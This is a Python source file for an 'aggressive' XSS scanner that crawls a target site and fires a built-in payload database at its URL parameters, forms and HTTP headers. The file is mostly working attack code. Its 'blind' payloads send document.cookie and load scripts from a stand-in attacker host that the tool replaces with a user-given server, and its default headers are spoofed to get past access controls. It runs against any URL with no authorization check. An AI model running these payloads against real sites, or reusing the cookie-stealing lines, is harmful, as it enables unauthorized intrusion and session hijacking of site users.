#!/usr/bin/env python3
"""
Ultimate XSS Scanner - Aggressive Mode (Latest Version)
Author: Your Name
Date: Current Date
Description: Advanced aggressive XSS scanner with DOM, Blind XSS, and advanced fuzzing
"""

import requests
import argparse
from urllib.parse import urlparse, urljoin, quote, parse_qs
from bs4 import BeautifulSoup
import random
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import json
import os
import hashlib
from colorama import init, Fore
import html

# Initialize colorama
init(autoreset=True)

# Global variables
VERSION = "3.0.0"
BANNER = f"""
{Fore.RED}╔═╗╔═╗╔╦╗╔═╗╦═╗╔═╗╔╦╗╔═╗╦═╗
{Fore.YELLOW}╠═╝╠═╣║║║║╣ ╠╦╝╠═╣ ║ ║╣ ╠╦╝
{Fore.GREEN}╩  ╩ ╩╩ ╩╚═╝╩╚═╩ ╩ ╩ ╚═╝╩╚═{Fore.RESET} v{VERSION} (Aggressive Mode)
"""

# Enhanced payload database
PAYLOADS = {
    "basic": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "\"><script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "';alert('XSS');//",
        "\";alert('XSS');//"
    ],
    "advanced": [
        "<iframe src=\"javascript:alert(`XSS`)\">",
        "<object data=\"javascript:alert('XSS')\">",
        "<body onload=alert('XSS')>",
        "<embed src=\"javascript:alert('XSS')\">",
        "<video><source onerror=\"alert('XSS')\">",
        "<audio src=x onerror=alert('XSS')>",
        "<marquee onstart=alert('XSS')>XSS</marquee>",
        "<details open ontoggle=alert('XSS')>"
    ],
    "obfuscated": [
        "<script>\\u0061\\u006C\\u0065\\u0072\\u0074('XSS')</script>",
        "<img src=x oneonerrorrror=alert('XSS')>",
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "<svg/onload=alert(/XSS/.source)>",
        "<img src='x'onerror='alert`XSS`'>",
        "<a href=\"javas&#99;ript:alert('XSS')\">Click</a>",
        "<div onmouseover=\"alert('XSS')\">Hover</div>"
    ],
    "dom": [
        "#<script>alert('XSS')</script>",
        "#javascript:alert('XSS')",
        "#\" onmouseover=\"alert('XSS')",
        "#'><img src=x onerror=alert('XSS')>",
        "#{alert('XSS')}",
        "#<svg/onload=alert(document.domain)>"
    ],
    "blind": [
        "<script src=http://your-server.com/xss.js></script>",
        "<img src=x onerror=\"fetch('http://your-server.com/log?data='+document.cookie)\">",
        "<iframe src=\"http://your-server.com/collect?data=\"+document.cookie>",
        "<link rel=stylesheet href=\"http://your-server.com/steal.css\">",
        "<script>new Image().src='http://your-server.com/?c='+encodeURI(document.cookie);</script>"
    ],
    "headers": [
        "X-Forwarded-Host: \"<script>alert('XSS')</script>",
        "Referer: javascript:alert('XSS')",
        "User-Agent: <svg/onload=alert('XSS')>",
        "Cookie: name=<script>alert('XSS')</script>"
    ],
    "prototype_pollution": [
        "__proto__[test]=<script>alert('XSS')</script>",
        "constructor[prototype][test]=<script>alert('XSS')</script>",
        "constructor.prototype.test=<script>alert('XSS')</script>"
    ],
    "mutation_xss": [
        "<noscript><p title=\"</noscript><img src=x onerror=alert('XSS')>\">",
        "<style><style/onload=alert('XSS')>",
        "<xss id=x tabindex=1 onfocus=alert('XSS')></xss>",
        "<input onfocus=alert('XSS') autofocus>"
    ]
}

# Headers for aggressive scanning
AGGRESSIVE_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'X-Forwarded-For': '127.0.0.1',
    'X-Original-URL': '/admin',
    'Referer': 'https://www.google.com/'
}

class AggressiveXSSScanner:
    def __init__(self, target_url, depth=2, threads=10, timeout=15, output=None, blind_server=None):
        self.target_url = target_url
        self.depth = depth
        self.threads = threads
        self.timeout = timeout
        self.output = output
        self.blind_server = blind_server
        self.session = requests.Session()
        self.session.headers.update(AGGRESSIVE_HEADERS)
        self.vulnerable_urls = set()
        self.scanned_urls = set()
        self.discovered_urls = set()
        self.checked_forms = set()
        self.checked_js = set()
        self.fuzz_params = set()
        
    def print_status(self, message, color=Fore.WHITE):
        print(f"{color}[*] {message}{Fore.RESET}")
        
    def print_success(self, message):
        print(f"{Fore.GREEN}[+] {message}{Fore.RESET}")
        
    def print_error(self, message):
        print(f"{Fore.RED}[-] {message}{Fore.RESET}")
        
    def print_warning(self, message):
        print(f"{Fore.YELLOW}[!] {message}{Fore.RESET}")
        
    def print_critical(self, message):
        print(f"{Fore.RED}[CRITICAL] {message}{Fore.RESET}")
        
    def save_result(self, url, payload, vector, context=""):
        result = f"URL: {url}\nPayload: {payload}\nVector: {vector}\nContext: {context}\n\n"
        if self.output:
            with open(self.output, 'a') as f:
                f.write(result)
        self.vulnerable_urls.add((url, payload, vector, context))
        
    def get_forms(self, url):
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.content, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            self.print_error(f"Error getting forms from {url}: {str(e)}")
            return []
    
    def extract_links(self, url):
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.content, 'html.parser')
            links = set()
            
            # Extract all possible links
            for tag in soup.find_all(['a', 'link', 'script', 'img', 'iframe'], href=True):
                links.add(urljoin(url, tag['href']))
            for tag in soup.find_all(['img', 'script', 'iframe'], src=True):
                links.add(urljoin(url, tag['src']))
            for tag in soup.find_all('form', action=True):
                links.add(urljoin(url, tag['action']))
            
            return {link for link in links if self.is_valid_url(link)}
        except Exception as e:
            self.print_error(f"Error extracting links from {url}: {str(e)}")
            return set()
    
    def is_valid_url(self, url):
        parsed = urlparse(url)
        if not parsed.scheme or not parsed.netloc:
            return False
        if parsed.scheme not in ['http', 'https']:
            return False
        if not any(ext in url for ext in ['.html', '.php', '.asp', '.aspx', '.jsp', '/']):
            return False
        return True
    
    def crawl(self, url, current_depth):
        if current_depth > self.depth:
            return
        
        if url in self.scanned_urls:
            return
        
        self.scanned_urls.add(url)
        self.print_status(f"Crawling (Depth {current_depth}): {url}")
        
        try:
            # Extract links and forms
            links = self.extract_links(url)
            forms = self.get_forms(url)
            
            # Add discovered URLs
            for link in links:
                if link not in self.discovered_urls and self.target_url in link:
                    self.discovered_urls.add(link)
            
            # Process forms
            for form in forms:
                form_id = f"{url}-{hash(str(form))}"
                if form_id not in self.checked_forms:
                    self.checked_forms.add(form_id)
                    self.test_form_xss(url, form)
            
            # Extract JavaScript files
            self.extract_js(url)
            
            # Recursive crawl
            for link in links:
                if link not in self.scanned_urls and self.target_url in link:
                    self.crawl(link, current_depth + 1)
        except Exception as e:
            self.print_error(f"Error crawling {url}: {str(e)}")
    
    def extract_js(self, url):
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            for script in soup.find_all('script', src=True):
                js_url = urljoin(url, script['src'])
                if js_url not in self.checked_js:
                    self.checked_js.add(js_url)
                    self.analyze_js(js_url)
        except Exception as e:
            self.print_error(f"Error extracting JS from {url}: {str(e)}")
    
    def analyze_js(self, js_url):
        try:
            response = self.session.get(js_url, timeout=self.timeout)
            js_content = response.text
            
            # Check for DOM XSS sinks
            sinks = [
                'document.write',
                'document.writeln',
                'innerHTML',
                'outerHTML',
                'eval(',
                'setTimeout(',
                'setInterval(',
                'Function(',
                'location.href',
                'location.hash',
                'window.name',
                'document.cookie',
                'postMessage',
                'localStorage',
                'sessionStorage'
            ]
            
            for sink in sinks:
                if sink in js_content:
                    self.print_warning(f"Potential DOM XSS sink in {js_url}: {sink}")
                    self.save_result(js_url, sink, "JavaScript Sink", "DOM XSS potential")
            
            # Check for URL parameters used in sinks
            url_param_pattern = re.compile(r'location\.search.*?=.*?["\']([^"\']+)["\']')
            matches = url_param_pattern.findall(js_content)
            for param in matches:
                self.fuzz_params.add(param)
                self.print_warning(f"URL parameter used in JS: {param} in {js_url}")
        except Exception as e:
            self.print_error(f"Error analyzing JS {js_url}: {str(e)}")
    
    def test_reflected_xss(self, url):
        parsed = urlparse(url)
        query = parsed.query
        
        if not query:
            return
        
        params = parse_qs(query)
        
        if not params:
            return
        
        # Test each parameter with all payload categories
        for param in params:
            for category in ['basic', 'advanced', 'obfuscated', 'dom', 'mutation_xss']:
                for payload in PAYLOADS[category]:
                    try:
                        # Create test URL with payload
                        test_params = params.copy()
                        test_params[param] = [payload]
                        test_query = "&".join(f"{k}={v[0]}" for k, v in test_params.items())
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                        
                        response = self.session.get(test_url, timeout=self.timeout)
                        response_text = html.unescape(response.text)
                        
                        # Check if payload is reflected
                        if payload in response_text:
                            context = self.get_reflection_context(response_text, payload)
                            self.print_success(f"Reflected XSS found in {url} - Parameter: {param} (Type: {category})")
                            self.save_result(url, payload, f"URL parameter: {param}", f"Type: {category}, Context: {context}")
                            break
                            
                        # Check for DOM XSS indicators
                        if category == 'dom' and ('#' + payload) in url:
                            self.print_success(f"Potential DOM XSS found in {url} - Parameter: {param}")
                            self.save_result(url, payload, f"URL parameter: {param}", "DOM XSS potential")
                    except Exception as e:
                        self.print_error(f"Error testing reflected XSS on {url}: {str(e)}")
    
    def get_reflection_context(self, text, payload):
        try:
            index = text.index(payload)
            start = max(0, index - 20)
            end = min(len(text), index + len(payload) + 20)
            return text[start:end].replace('\n', ' ').replace('\r', ' ')
        except:
            return "Context not available"
    
    def test_form_xss(self, url, form):
        try:
            details = {}
            action = form.attrs.get('action', '').lower()
            method = form.attrs.get('method', 'get').lower()
            inputs = form.find_all('input')
            
            target_url = urljoin(url, action)
            
            form_data = {}
            for input_tag in inputs:
                input_name = input_tag.attrs.get('name')
                input_type = input_tag.attrs.get('type', 'text')
                input_value = input_tag.attrs.get('value', '')
                
                if input_name and input_type != 'submit':
                    form_data[input_name] = input_value
            
            # Test with all payload categories
            for category in ['basic', 'advanced', 'obfuscated', 'mutation_xss']:
                for payload in PAYLOADS[category]:
                    try:
                        test_data = form_data.copy()
                        for field in test_data:
                            test_data[field] = payload
                        
                        if method == 'post':
                            response = self.session.post(target_url, data=test_data, timeout=self.timeout)
                        else:
                            response = self.session.get(target_url, params=test_data, timeout=self.timeout)
                        
                        response_text = html.unescape(response.text)
                        
                        if payload in response_text:
                            context = self.get_reflection_context(response_text, payload)
                            self.print_success(f"Stored XSS found in form at {target_url} (Type: {category})")
                            self.save_result(target_url, payload, "HTML Form", f"Type: {category}, Context: {context}")
                            break
                    except Exception as e:
                        self.print_error(f"Error testing form XSS on {target_url}: {str(e)}")
            
            # Test for blind XSS if server is provided
            if self.blind_server:
                self.test_blind_xss_form(target_url, form_data, method)
        except Exception as e:
            self.print_error(f"Error processing form on {url}: {str(e)}")
    
    def test_blind_xss_form(self, url, form_data, method):
        try:
            for payload in PAYLOADS['blind']:
                try:
                    test_data = form_data.copy()
                    for field in test_data:
                        test_data[field] = payload.replace('your-server.com', self.blind_server)
                    
                    if method == 'post':
                        self.session.post(url, data=test_data, timeout=self.timeout)
                    else:
                        self.session.get(url, params=test_data, timeout=self.timeout)
                    
                    self.print_warning(f"Blind XSS payload submitted to {url}")
                    self.save_result(url, payload, "Blind XSS", "HTML Form")
                except Exception as e:
                    self.print_error(f"Error testing blind XSS on {url}: {str(e)}")
        except Exception as e:
            self.print_error(f"Error in blind XSS test for {url}: {str(e)}")
    
    def test_headers_xss(self, url):
        try:
            # Test each header payload
            for payload in PAYLOADS['headers']:
                try:
                    headers = AGGRESSIVE_HEADERS.copy()
                    header_name, header_value = payload.split(": ", 1)
                    headers[header_name] = header_value
                    
                    response = self.session.get(url, headers=headers, timeout=self.timeout)
                    
                    if header_value in response.text:
                        self.print_success(f"Header-based XSS found at {url} via {header_name}")
                        self.save_result(url, payload, "Header Injection", header_name)
                except Exception as e:
                    self.print_error(f"Error testing header XSS on {url}: {str(e)}")
        except Exception as e:
            self.print_error(f"Error in header XSS test for {url}: {str(e)}")
    
    def test_prototype_pollution(self, url):
        try:
            parsed = urlparse(url)
            query = parsed.query
            
            if not query:
                return
            
            # Test each prototype pollution payload
            for payload in PAYLOADS['prototype_pollution']:
                try:
                    test_url = f"{url}&{payload}"
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    # Check for errors that might indicate successful pollution
                    if response.status_code == 500:
                        self.print_warning(f"Potential prototype pollution at {url}")
                        self.save_result(url, payload, "Prototype Pollution", "500 Error")
                except Exception as e:
                    self.print_error(f"Error testing prototype pollution on {url}: {str(e)}")
        except Exception as e:
            self.print_error(f"Error in prototype pollution test for {url}: {str(e)}")
    
    def start_scan(self):
        self.print_status(f"Starting Ultimate XSS Scanner v{VERSION} (Aggressive Mode)")
        self.print_status(f"Target: {self.target_url}")
        self.print_status(f"Scan depth: {self.depth}")
        self.print_status(f"Threads: {self.threads}")
        if self.blind_server:
            self.print_status(f"Blind XSS server: {self.blind_server}")
        
        # Start crawling
        self.crawl(self.target_url, 1)
        
        # Add the target URL itself if not already included
        if self.target_url not in self.scanned_urls:
            self.discovered_urls.add(self.target_url)
        
        # Create tasks for all tests
        tasks = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Submit all tests for each URL
            for url in self.discovered_urls:
                tasks.append(executor.submit(self.test_reflected_xss, url))
                tasks.append(executor.submit(self.test_headers_xss, url))
                tasks.append(executor.submit(self.test_prototype_pollution, url))
            
            # Submit JS analysis tasks
            for js_url in self.checked_js:
                tasks.append(executor.submit(self.analyze_js, js_url))
            
            # Wait for all tasks to complete
            for task in as_completed(tasks):
                try:
                    task.result()
                except Exception as e:
                    self.print_error(f"Error in scan task: {str(e)}")
        
        # Print summary
        self.print_status("\nAggressive scan completed!", Fore.CYAN)
        if self.vulnerable_urls:
            self.print_critical(f"Found {len(self.vulnerable_urls)} potential XSS vulnerabilities:")
            for vuln in self.vulnerable_urls:
                print(f"\n{Fore.YELLOW}URL: {vuln[0]}")
                print(f"{Fore.RED}Payload: {vuln[1]}")
                print(f"{Fore.BLUE}Vector: {vuln[2]}")
                print(f"{Fore.MAGENTA}Context: {vuln[3]}")
        else:
            self.print_status("No XSS vulnerabilities found.", Fore.GREEN)
        
        if self.output:
            self.print_status(f"Results saved to {self.output}", Fore.CYAN)

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(description='Ultimate XSS Scanner - Aggressive Mode')
    parser.add_argument('-u', '--url', required=True, help='Target URL to scan')
    parser.add_argument('-d', '--depth', type=int, default=2, help='Crawling depth (default: 2)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-o', '--output', help='Output file to save results')
    parser.add_argument('-T', '--timeout', type=int, default=15, help='Request timeout in seconds (default: 15)')
    parser.add_argument('-b', '--blind', help='Blind XSS server URL for callback detection')
    
    args = parser.parse_args()
    
    try:
        scanner = AggressiveXSSScanner(
            target_url=args.url,
            depth=args.depth,
            threads=args.threads,
            timeout=args.timeout,
            output=args.output,
            blind_server=args.blind
        )
        scanner.start_scan()
    except KeyboardInterrupt:
        print("\nScan interrupted by user. Exiting...")
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == '__main__':
    main()